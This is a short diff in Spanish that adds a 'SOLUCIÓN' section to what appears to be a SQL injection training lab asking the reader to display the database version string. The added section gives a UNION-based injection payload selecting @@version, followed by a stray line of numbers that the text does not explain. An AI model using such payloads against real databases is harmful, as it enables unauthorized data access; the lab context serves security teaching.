@@ -5,3 +5,7 @@ Puede utilizar un ataque UNION para recuperar los resultados de una consulta iny
 
 Para resolver la práctica de laboratorio, muestre la cadena de versión de la base de datos.
 
+---SOLUCIÓN---
+En esta ocasión es la misma que 
+'+UNION+SELECT+@@version,+NULL#
+128  64  32
